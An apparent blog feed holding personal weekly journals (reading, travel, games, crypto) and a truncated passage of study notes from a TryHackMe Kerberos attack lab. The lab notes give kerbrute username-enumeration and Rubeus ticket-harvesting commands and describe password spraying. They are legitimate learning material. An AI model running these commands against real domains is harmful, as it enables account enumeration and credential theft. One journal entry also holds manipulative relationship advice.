    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>本周挑选了《后现代真相》继续阅读，看了一点感觉一般般吧。但是现在下定论还有点早，后面多看了一些后再做评价</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>无</p><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>这周开始学习ATT&amp;CK攻击链了，但目前还没有找到适合的学习方法，只是单纯阅读而已。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>拿到护照喽，日本攻略也做了三分之一，观看许多攻略视频后发现，同样的地点不同的博主会有不一样的攻略和侧重点，不过总体上还是大同小异。</p><p>这周开了死亡搁浅的新坑，死亡搁浅是我接触的第一部小岛秀夫的作品，游戏开头有好多画面给人的感觉像在看电影一样，配乐的插入也很神，目前感觉还行，趁现在比较闲有时间好好感受一下吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;本周挑选了《后现代真相》继续阅读，看了一点感觉一般般吧。但是现在下定论还有点早，后面多看了一些后再做评价&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-22</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-22/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-22/</id>
    <published>2024-12-22T17:39:33.823Z</published>
    <updated>2024-12-22T18:10:26.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>把《刻意练习》看完了，大概花了两个多月看完的，这两个多月中间也不是每天都在看，有时候断个一两天或几天没看。其实看书也没想象中的那么难，《刻意练习》的pdf有效内容有五百多页，最后我也看完了，并且还做了读书笔记。未来还是要坚持看书的习惯，同时希望自己能优化读书笔记的内容。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>这周看到一则关于四川某高中开设“学霸就餐区”引发争议的新闻。</p><p>看了一眼知乎讨论，大部分人似乎都很支持这样的做法，主要的理由的有：</p><ul><li>“学霸就餐区”不止奖励学霸，还奖励进步第一的人</li><li>奖励机制更有利于学生努力</li><li>好学生受到奖励理所应当，学校的做法没问题</li></ul><p>设定适当的奖励并无过错，但是我认为学校将吃食这种最基本的需求作为奖励不太适合。学校完全可以用笔，笔记本或者其他文创作品等作为奖励。通过划分就餐区域以及区别对待学生菜品这种赤裸裸的行为无形中会强化学生心里对于阶级的概念，对部分学生的心理健康可能产生不好的影响。例如一部分努力却没有取得突出进步的学生可能会产生自卑或者嫉妒心理，一些长期榜上有名的“学霸”可能会产生优越心理，认为自己高其他学生一等等。</p><p>对于在意学习成绩的学生而言，成绩单排名的上升与下降已经是一种奖励与惩罚了，没有必要再通过这种显眼的奖励来将成绩的差别具象化。对于学生来说学习固然重要，但是成绩只是求学生涯的一部分。我认为能培养一个良好的心态来面对生活中的竞争，以及培养学生人人平等，不以成绩分贵贱的理念更重要。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周办了护照以及开始做了一点点去日本攻略，真是看得我眼花缭乱，做攻略做出写作业的感觉。</p><p>这周向一些行业的前辈询问了职业发展规划，得到了许多有用的建议。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;把《刻意练习》看完了，大概花了两个多月看完的，这两个多月中间也不是每天都在看，有时候断个一两天或几天没看。其实看书也没想象中的那么难，《刻意</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-15</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-15/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-15/</id>
    <published>2024-12-15T16:26:01.490Z</published>
    <updated>2024-12-15T16:45:10.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>终于把《刻意练习》推进到最后一章了，继续加油。不过读书笔记做得有点复杂，希望后面能做得更精简一些</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>这周看到一个观点，说现在的国人都习惯了增长思维。</p><p>因为过去几十年的经济快速增长，人们都习惯了这种增长思维，具体表现为认为宏观经济会一直向好，房价会一直上涨，工资会一直涨高等等。这种观念是错误的，以上提到的种种增长，很大一部分原因是人们乘上了中国经济发展的浪潮，跟个人的能力并没有太大关系。但是当前中国的经济发展已经达到了一定程度，经济无法再保持快速增长，所以我认为在未来要警惕这种增长思维，在考虑以后的一些事情时，也要有所顾虑，不要认为所有事情会一直向好的方向发展。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周几乎没有干什么事，每天生活还是比较重复的。。。虽然没什么压力，但又有种虚度光阴的感觉，从下周开始给自己每天都安排一些事情，不要总是漫无目的地刷视频和玩游戏。</p><p>这周的投资遭遇了好几次大回调，损失惨重。得到的教训就是，在牛市中如果涨到一定程度要及时换仓一小部分出来，防止插针利润回吐，同时也可以在插针行情中吃到一部分涨幅。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;终于把《刻意练习》推进到最后一章了，继续加油。不过读书笔记做得有点复杂，希望后面能做得更精简一些&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-9</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-9/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-9/</id>
    <published>2024-12-09T10:54:53.365Z</published>
    <updated>2024-12-15T16:27:46.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>这周忙回家的事，书基本没读多少。。。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>这周看到的新观点：不要打压女人</p><p>在长期关系中，很多人会犯一个错误：打压女人。</p><p>具体表现为：认为女人这不好那好，工作不好，异想天开，不聪明，有法令纹，脸垮了等等</p><p>在长期关系中，这种行为是非常幼稚的，因为这种语言暴力，也是属于用暴力去控制女性的一种。</p><blockquote><p>我猜想，在远古时期，男人为了保障自己的繁衍收益，或者试图长期低成本持有，就会这么干，这毕竟是成本最低的方式。</p></blockquote><p>现代社会为女性建立了复杂的保障机制，你觉得她这里不好哪里不好，在网络时代统统没用。女性反手将自己的经历发到网上，就能获得几万点赞以证明自己的正确性，有大批男的急着去舔你认为不好的地方。</p><p>想在长期关系中如鱼得水，最好的办法就是对女人捧杀。</p><p>只要女性去接触社会了，自然会碰壁。觉得自己好看的，会在他人的区别对待中知道自己到底几斤几两。觉得自己能力强的到了实际工作中一下就现形。</p><p>所有打压，责骂，教育交给别人去做。让领导去骂他，让上级去批评她，让接过去惩罚她。而自己要做的，就是捧杀。</p><ul><li>“你在我心中永远是最美的”</li><li>“你总是有不一样的想法”</li><li>“那是他们没发现你的才华”</li></ul><p><strong>如果你满足了女人的慕强，但是你又愿意弯下腰来对她发自内心的赞美，这就是最稀缺且致命的男人</strong></p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>这周cod出了新僵尸地图沉迷了好几天。</p><p>这周完全放空，刷视频刷了好久。</p><p>思考了一下自己为什么会拖延，因为一直想要有种玩爽的感觉，但是现在不管干什么都没有那种玩爽的感觉了，游戏也好看视频也好，玩完看完只会觉得浪费时间，没有以前很爽的感觉。（这周的COD僵尸地图除外😁）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;这周忙回家的事，书基本没读多少。。。&lt;/p&gt;
&lt;h1 id=&quot;信息&quot;&gt;&lt;a href=&quot;#信息&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-12-1-短视频刷多了会变笨吗？</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-1-%E7%9F%AD%E8%A7%86%E9%A2%91%E5%88%B7%E5%A4%9A%E4%BA%86%E4%BC%9A%E5%8F%98%E7%AC%A8%E5%90%97%EF%BC%9F/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-12-1-%E7%9F%AD%E8%A7%86%E9%A2%91%E5%88%B7%E5%A4%9A%E4%BA%86%E4%BC%9A%E5%8F%98%E7%AC%A8%E5%90%97%EF%BC%9F/</id>
    <published>2024-11-30T17:43:51.969Z</published>
    <updated>2025-02-28T17:04:40.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>本周继续推进《刻意练习》，另一方面闲暇时也会看看《动物农场》。</p><p>本周的阅读欲望不是很强，基本看书前都要先刷一会视频，希望下次能改进这个习惯。</p><p>另一方面由于没去图书馆在宿舍也不怎么想看书，对于我来说目前看书还是一个比较消耗精力和自制力的活动，一个安静的环境还是必要的。但愿过几天回家后能改善这种情况。</p><p>小说情节积累</p><h3 id="《动物农场》"><a href="#《动物农场》" class="headerlink" title="《动物农场》"></a>《动物农场》</h3><p>在动物农场中，作为领导者的猪享用起特供的牛奶和苹果。其他动物对此颇有微词，此时猪便跳出来解释说自己作为脑力劳动者，承担了农场里大大小小的领导工作，理应享受牛奶和苹果以保持身体健康。同时又恐吓如果自己的领导工作没做好，琼斯（原农场主）将会回来，后果不堪设想。</p><p>在后续的情节中，拿破仑“武力”赶走了雪球，为了压住其他动物对自己的议论，又再一次搬出琼斯这一外部威胁。</p><p>这些作为领导者的猪用外部矛盾保证内部团结，为自己的特权正当化找借口。</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>本周并没有看到什么印象比较深刻的新闻。</p><h3 id="《短视频刷多了会变笨吗？》"><a href="#《短视频刷多了会变笨吗？》" class="headerlink" title="《短视频刷多了会变笨吗？》"></a>《短视频刷多了会变笨吗？》</h3><p>上周看了《短视频加速我们衰老》的视频后，我又看了该UP主的另一个视频《短视频刷多了会变笨吗？》</p><p>学习到了一个新观点</p><p><strong>在表述中尽量避免使用代词，如“这个那个，这种那种”</strong></p><p>在没有表述清楚的情况下尽量避免使用各种代词，把想表达的表达清楚，用最精确的词去表述。</p><p>如果找不到精确的描述词或者解释，这就表明，你没有语言作为载体去深入地形成自己的理解和思想。</p><p>短视频会让我们变得不会表达（变笨）的原因在于整个话语空间的词库都太同质化，太扁平，太局限了。虽然每天看是刷了很多内容，但实际上都是一些重复的语料库，它会大大压缩你的日常词汇量。（如糯叽叽，绝绝子，老过瘾了etc.）</p><p>另一方面，短视频会倾向于使用模糊化的词汇，词汇越模糊，大家的理解成本就越低，得到的关注就越多。短视频很少会去精确的形容某一个好吃的食物或者对风景的感受，时间一长，我们就会渐渐“失语”，当我们吃了一口好菜，看到美丽的风景时，脑子里只会蹦出重复的网络用语。</p><p>语言的匮乏会使我们变笨，因为语言是构成思维的<strong>官能</strong>，语言的边界就是世界的边界，只有语言是细腻的思维才会细腻。网络空间中太多同质化和重复的信息，这些日渐模糊的，日渐代词化的，企图减少我们理解成本的用语，实际上实在重塑和简化我们的思维。语言用不同的方式对现实世界的范畴划分，这些迥异的方式就会限制我们大脑组织认识的方式。</p><p>对于以上问题，UP主提出的解决方式有：</p><ol><li>多读一些严肃性的书籍，或者去听一些非批量生产的洞见</li><li>尽量去精准化自己的用词，少用代词，尝试去形容自己的感受，为自己模糊的想法找到一个精确的词，并尽量多替换同义词，去扩大自己的词库</li></ol><blockquote><p>你的思维之广袤，只是被单薄的语言限制了。我们给思维配备更好的语言工具你会走的更深远。</p></blockquote><h3 id="人到了一定年纪圈子是会固定的"><a href="#人到了一定年纪圈子是会固定的" class="headerlink" title="人到了一定年纪圈子是会固定的"></a>人到了一定年纪圈子是会固定的</h3><p>这是我本周引发我思考的另一个视频</p><p>在视频中，UP主提到自己虽然处于还能被称为年轻人的26岁年纪，但是生活已经固定，固定的衣服，固定的审美，固定的性格等等。并且工作后就没有交到新朋友，要好的朋友只有一个高中同学和大学同学。</p><p>这个问题我在实习的时候就有想过。当时自己自己周末一个人躺在出租屋里，没有任何社交活动就很寂寞。我认为朋友还是挺重要的，一个好的朋友可以提供精神上的陪伴或者现实生活的帮助。有时候自己在生活中很纠结内耗的问题，只需要朋友简单的安慰就能化解。在遇到挫折时，我往往会感受到一种无助感，而此时朋友就能提供很好的支持，实在不济，也能作为倾诉对象，让自己吐出心中的不快。</p><p>在工作之后，我打算把一部分精力放在拓展社交圈上，让自己多认识一些朋友。不过具体的要怎么做暂时放到以后再想。</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>本周我想到，在阅读小说时，如果有哪些桥段是对现实事件&#x2F;观点的映射或讽刺，可以把这个情节记录成一个小故事，在以后可以用做聊天时的谈资。</p><p>这周的生活我开始感觉到重复了，这种重复的生活真的会放大自己的负面情绪，以及让自己有种浪费青春的感觉，希望自己能快点走出这个状态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;本周继续推进《刻意练习》，另一方面闲暇时也会看看《动物农场》。&lt;/p&gt;
&lt;p&gt;本周的阅读欲望不是很强，基本看书前都要先刷一会视频，希望下次能</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>周报2024-11-25-沉迷短视频加速我的衰老</title>
    <link href="https://mizore.site/article/%E5%91%A8%E6%8A%A52024-11-25-%E6%B2%89%E8%BF%B7%E7%9F%AD%E8%A7%86%E9%A2%91%E5%8A%A0%E9%80%9F%E6%88%91%E7%9A%84%E8%A1%B0%E8%80%81/"/>
    <id>https://mizore.site/article/%E5%91%A8%E6%8A%A52024-11-25-%E6%B2%89%E8%BF%B7%E7%9F%AD%E8%A7%86%E9%A2%91%E5%8A%A0%E9%80%9F%E6%88%91%E7%9A%84%E8%A1%B0%E8%80%81/</id>
    <published>2024-11-24T18:07:47.183Z</published>
    <updated>2025-02-28T17:04:24.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h1><p>本周继续推进《刻意练习》进度</p><p>阅读了“在工作中运用刻意练习”和“在生活中运用刻意练习”两个章节</p><p>​这两个章节给我的感觉像是对之前文章中提出的关于刻意练习的各种观点进行一个运用示例，用许多例子来展示这些观点在生活中的运用，通过生活以及工作中例子来对之前提出的种种观点做一些补充，同时巩固读者对于这些例子的理解以及加深记忆。</p><p>《动物农场》与《1984》加入书单，希望在闲的时候能靠小说打发时间</p><h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>本周让我收获最大的视频是这个：<a href="https://www.bilibili.com/video/BV1y3DKY4E6h">沉迷短视频加速我的衰老</a></p><p>在视频中我学习到了许多新观点</p><p>视频UP主提出两个衰老的标志：<strong>神经可塑性下降</strong>与<strong>感觉时间过得很快</strong></p><ul><li><p><strong>神经可塑性下降</strong></p><p>视频UP主提出，短视频很多都是重复的内容，比如重复的“爆款”标题，重复的洗脑音乐，千篇一律的段子等等。而摄入重复的内容会削弱神经的可塑性，而这正是衰老的标志之一（神经可塑性，即大脑对新事物适应和学习能力）。衰老来自思维模式的僵化，面对新的复杂信息时感到吃力甚至会感到焦虑或挫败。</p><p>​         </p></li><li><p><strong>时间过得很快</strong></p><p>就比如小时候的暑假感觉无尽漫长，但是对于花甲老人来说十年如一日。</p><p>这是因为随着神经可塑性的下降，年长的人不再摄入新的知识和体验，年岁的坟墓越变越大，新的记忆与体验的分子却越变越小，时间就会变得非常快。</p></li></ul><p>主观时间的快慢来自于我们在过去一段时间里面所做事物的丰富程度，而短视频总是在赋予我们同样的体验，总量信息几乎是没有增加的。摄入的营养知识越来越少，主观时间流逝就会更快，主管时间越快，主管生命就会越短，衰老就会加速。</p><p>在视频结尾，视频UP主提出几个对抗方法</p><ol><li>去看长篇幅&#x2F;非同质化的内容</li><li>减少使用网络用语（语言细腻思维才会细腻）</li><li>少用代词（比如这个那个，这种那种等），语言的边界就是世界的边界</li><li>面对信息去溯源，质疑，反思，辩论（有意识地训练深度思考，不要依赖二手信息）</li></ol><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><p>无</p><h1 id="生活-x2F-其他"><a href="#生活-x2F-其他" class="headerlink" title="生活&#x2F;其他"></a>生活&#x2F;其他</h1><p>本周加密货币市场也是迎来牛市，每次币价上涨都让我很兴奋浮躁，像初高中放假前最后一节课的感觉。难以静下心来做其他事。但是市场无常，每当我兴奋过后，面对币价下跌&#x2F;回调就会有点失落。客观来看这一段时间我整个人的心情就是被币价支配，半场开香槟到头来一场空。希望自己以后能改掉这个习惯，不管币价如何都能专心做该做的事情。</p><p>这周看了青春旅行团的第五期，我发现每期都会有人在旅途中用一些小游戏来调动氛围，虽然这些小游戏可能很普通，但是大家一起玩就会显得很有意思。</p><p>这周我希望自己能找到其他杀时间的方式，而不是只会刷知乎，看B站短视频和刷贴吧，不要把整块的时间花在这种碎片化的活动上。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;阅读&quot;&gt;&lt;a href=&quot;#阅读&quot; class=&quot;headerlink&quot; title=&quot;阅读&quot;&gt;&lt;/a&gt;阅读&lt;/h1&gt;&lt;p&gt;本周继续推进《刻意练习》进度&lt;/p&gt;
&lt;p&gt;阅读了“在工作中运用刻意练习”和“在生活中运用刻意练习”两个章节&lt;/p&gt;
&lt;p&gt;​	这两个章节给</summary>
      
    
    
    
    <category term="周报" scheme="https://mizore.site/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>kerberos攻击学习</title>
    <link href="https://mizore.site/article/kerberos%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/tryhackme_Attacking%20Kerberos%20room/"/>
    <id>https://mizore.site/article/kerberos%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/tryhackme_Attacking%20Kerberos%20room/</id>
    <published>2023-09-17T12:08:03.939Z</published>
    <updated>2024-11-24T16:52:03.539Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="kerberos攻击学习"><a href="#kerberos攻击学习" class="headerlink" title="kerberos攻击学习"></a>kerberos攻击学习</h1><p>这个房间主要介绍windows的票证授予服务kerberos的基础知识，以及如何攻击kerberos获得各类票据，甚至获得域管理员。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>kerberos是以windows域的一个身份认证服务，通过第三方票证授权的方式以及更强的加密来比NTLM更加安全。目前kerberos已经是windows域的默认身份认证服务，但是依然存在漏洞。</p><h3 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h3><ul><li><strong>TGT（Ticket Granting Ticket，票证授予票）</strong>：TGT可以看做是域认证的身份认证，相当于门票。通过身份认证后用户会获得TGT，只有拥有TGT后用户才可以向TGS请求域中特定服务的票证。</li><li><strong>KDC（Key Distribution Center，密钥分发中心）</strong>：密钥分发中心负责颁发TGT和服务票据，由<strong>身份验证服务</strong>和<strong>票据授予服务</strong>组成。</li><li><strong>AS（Authentication Service，身份验证服务）</strong>：身份验证服务发出TGT，供域中的TGS使用，以请求访问其他计算机和服务票证。</li><li><strong>TGS（Ticket Granting Service，票征授予服务）</strong>：票征授予服务在获取TGT后将票证返回到域中的计算机。</li><li><strong>SPN（Service Principal name，服务主体名称）</strong>：服务主体名称为服务实例提供标识符，<strong>将服务实例与域服务账户相关联</strong>。Windows要求服务具有与服务账户，这就是服务需要SPN集的原因。</li><li><strong>KDC LT Key（KDC Long Term Secret Key，KDC长期(加密)密钥）</strong>：这个KDC key（KDC LT Key）基于KRBTGT服务账户。用于<strong>加密TGT</strong>和为<strong>PAC</strong>证书签名。</li><li><strong>Client LT Key（Client Long Term Secret Key，客户端长期(加密)密钥）</strong>：客户端密钥基于计算机或者服务账户。用于加密时间戳和加密<strong>会话密钥（session key）</strong>。</li><li><strong>Service LT Key（Service Long Term Secret Key，服务长期(加密)密钥）</strong>：这个密钥（服务密钥）基于服务账户。用于加密服务票据和给对<strong>PAC</strong>进行数字签名。</li><li><strong>Session Key（会话密钥）</strong>:KDC在给用户发放TGT时会一同发放会话密钥，用户在请求服务票证时将TGT与会话密钥一同发送给KDC，用户在使用会话向服务证明并请求访问权限。</li><li><strong>PAC（Privilege Attribute Certificate，特权属性证书）</strong>：PAC保存用户的所有相关信息，它与TGT一起发送到KDC，由目标服务长期密钥（Servic LT Key）和KDC长期密钥（KDC LT Key）进行数字签名，以验证用户。</li></ul><h3 id="AS-REQ-x2F-预身份验证-细节"><a href="#AS-REQ-x2F-预身份验证-细节" class="headerlink" title="AS-REQ &#x2F; 预身份验证 细节"></a>AS-REQ &#x2F; 预身份验证 细节</h3><p>当用于向KDC请求TGT时，Kerberos身份验证中的AS-REQ步骤开始。为验证用户并创建TGT，KDC必须遵循确切的步骤。用户的第一步是加密计算出时间戳的NT散列值并将其发送到AS。KDC尝试使用用户提供的NT散列值来解密时间戳，如果成功，KDC将为用户颁发TGT以及会话密钥。（这里的NT hash即NTLM hash的简写）</p><p>附：NT Hash计算方式</p><blockquote><p>NT Hash计算过程相比LM Hash来得简单。</p><ul><li>1.转换为16进制</li><li>2.Unicode编码</li><li>3.MD4加密的16进制就是NT hash</li></ul></blockquote><h3 id="TGT-票据授予票-内容"><a href="#TGT-票据授予票-内容" class="headerlink" title="TGT(票据授予票)内容"></a>TGT(票据授予票)内容</h3><p>为了理解服务票据（service ticket）是如何创建和验证的，我们需要从票据的来源开始。用户将TGT提供给KDC，作为返回（回报），KDC将验证TGT并返回服务票据（service ticket）</p><p><img src="https://i.imgur.com/QFeXDN0.png"></p><h3 id="ST（Service-Ticket即TGS，服务票据）内容"><a href="#ST（Service-Ticket即TGS，服务票据）内容" class="headerlink" title="ST（Service Ticket即TGS，服务票据）内容"></a>ST（Service Ticket即TGS，服务票据）内容</h3><p>要理解kerberos身份验证是如何工作的，你首先要知道明白这些票据的内容和他们是如何验证的。服务票据包含两个部分：服务提供部分和用户提供部分。</p><ul><li>服务部分：用户详细信息、会话密钥；该票证使用服务账户的NTLM哈希加密。</li><li>用户部分：有效的时间戳、会话密钥；使用TGT会话密钥（TGT session key）加密。</li></ul><p><img src="https://i.imgur.com/kUqrVBa.png"></p><h3 id="Kerberos身份验证概述"><a href="#Kerberos身份验证概述" class="headerlink" title="Kerberos身份验证概述"></a>Kerberos身份验证概述</h3><p><img src="https://i.imgur.com/VRr2B6w.png"></p><p>AS-REQ 1. 客户端请求身份验证票据或票据授予票证（TGT）</p><p>AS-REQ 2. 密钥分发中心在身份验证后返回加密的TGT和会话密钥</p><p>AS-REQ 3. 客户端将加密的TGT发送到**票证授予服务器(TGS)**，其中包含客户端想要访问的服务的服务主体名称（SPN）</p><p>AS-REQ 4. 密钥分发中心（KDC）验证用户的TGT以及用户是否有权限访问该服务，然后向客户端发送该服务的有效会话密钥及票据</p><p>AS-REQ 5. 客户端请求服务并发送有效会话密钥以证明用户具有访问权限。</p><p>AS-REQ 6. 服务授予访问权限。</p><h3 id="kerberos票证概述"><a href="#kerberos票证概述" class="headerlink" title="kerberos票证概述"></a>kerberos票证概述</h3><p>在攻击kerberos的过程中，最常见的票证是票证授予票（TGT），这些票证可以有很多形式（后缀），例如Rubeus的<code>.kirbi</code>，Impacket的<code>.ccache</code>。最主要的还是<code>.kirbi</code>票证，这些票证通常是使用base64编码并可以用于各种攻击。TGT仅与KDC一起使用以获得服务票证。一但你提供TGT，服务器就会获取用户详细信息、会话密钥，然后使用服务账户的NTLM哈希对票证（TGT）进行加密。 </p><p>然后你的TGT会提供加密时间戳、会话密钥和加密过的TGT。然后KDC将验证TGT并返回所请求服务的服务票证。普通的TGT只能与连接到它的给定服务账户一起使用（白银票据），但是KRBTGT允许你获取所需的任何票证（黄金票据），从而允许访问你访问域上所需的任何内容。</p><h3 id="kerberos攻击权限要求"><a href="#kerberos攻击权限要求" class="headerlink" title="kerberos攻击权限要求"></a>kerberos攻击权限要求</h3><ul><li>kerbrute枚举-无需域访问</li><li>PTT（Pass The Ticket 传递票据）：以用户身份访问所需的域</li><li>kerberoasting：根据任何用户的需要进行访问</li><li>AS-REP Roasting（AS-REP烘焙）：根据任何用户的需要进行访问</li><li>金票：需要完整的域妥协（domain compromise）（域管理员）</li><li>银票：需要服务哈希</li><li>万能钥匙：需要完整的域妥协（域管理员）</li></ul><h2 id="使用kerbrute进行枚举——检测kerbrute中可利用账户"><a href="#使用kerbrute进行枚举——检测kerbrute中可利用账户" class="headerlink" title="使用kerbrute进行枚举——检测kerbrute中可利用账户"></a>使用kerbrute进行枚举——检测kerbrute中可利用账户</h2><p>kerbrute是一种流行的枚举工具，其原理是利用kerberos的<strong>预身份验证</strong>来暴力破解和枚举有效的活动目录（AD）用户。</p><p>在攻击前需要将DNS域名和计算机IP添加到攻击者计算机内的&#x2F;etc&#x2F;host中，否则攻击将不起作用。</p><p>以下笔记中使用的靶机IP和域控如下</p><p><code>10.10.58.156 CONTROLLER.local</code></p><h3 id="滥用预身份验证概述"><a href="#滥用预身份验证概述" class="headerlink" title="滥用预身份验证概述"></a>滥用预身份验证概述</h3><p>通过强制kerberos预身份验证不会触发账户登陆失败事件，但是可能会给触发设备告警，引起蓝队注意。通过kerberos暴力破解时，可以通过仅向KDC发送单个UDP帧来进行暴力破解，从预先提供好的字典里列举域上的用户。</p><blockquote><p>Kerbrute 安装 - </p><p>1.) 下载适用于您的操作系统的预编译二进制文件 - <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p><p>2.) 将 kerbrute_linux_amd64 重命名 为 kerbrute</p><p>3.) <code>chmod +x kerbrute</code> - 使 kerbrute 可执行</p></blockquote><h3 id="Kerbrute使用"><a href="#Kerbrute使用" class="headerlink" title="Kerbrute使用"></a>Kerbrute使用</h3><p>进入kerbrute目录后，准备好爆破用用户名字典，使用以下命令运行Kerbrute爆破域中存在的账户</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;kerbrute usernum --dc CONTROLLER.local -d CONTROLLER.local User.txt</code></pre><h2 id="使用Rubeus暴力破解-x2F-收割票证"><a href="#使用Rubeus暴力破解-x2F-收割票证" class="headerlink" title="使用Rubeus暴力破解&#x2F;收割票证"></a>使用Rubeus暴力破解&#x2F;收割票证</h2><p>Rubeus是用于攻击Kerberos的工具。Rubeus是kekeo工具的改编版，更加强大。Rubeus具有多种攻击方式和功能，包括跨越哈希（Overpass the hash&#x2F;Pass-the-Key），票证请求（Ticket Request）和票证延期（renewals），票证管理，票证提取，收获，传递票证（pass the ticket），AS-REP烘焙（AS-REP Roasting）和kerberoasting</p><h3 id="使用rubeus获取票证"><a href="#使用rubeus获取票证" class="headerlink" title="使用rubeus获取票证"></a>使用rubeus获取票证</h3><p>通过截获正在传递到KDC的票证并将其保存以用于其他攻击，例如PTT</p><p>攻击命令如下</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe harvest &#x2F;interval:30</code></pre><p>该命令告诉RUbeus每30s收集一次TGT</p><h3 id="使用Rubeus进行暴力破解密码-x2F-密码喷射"><a href="#使用Rubeus进行暴力破解密码-x2F-密码喷射" class="headerlink" title="使用Rubeus进行暴力破解密码&#x2F;密码喷射"></a>使用Rubeus进行暴力破解密码&#x2F;密码喷射</h3><blockquote><p>Rubeus 既可以暴力破解密码，也可以喷洒密码用户帐户。当暴力破解密码时，您可以使用单个用户帐户和密码单词列表来查看哪个密码适用于该给定用户帐户。在密码喷射中，您提供一个密码（例如Password1），然后对域中找到的所有用户帐户进行“喷射”，以查找哪些帐户可能拥有该密码。</p><p>此攻击将获取给定的基于 Kerberos 的密码，并将其喷洒到所有找到的用户上，并提供 .kirbi 票证。该票证是一个TGT，可用于从 KDC 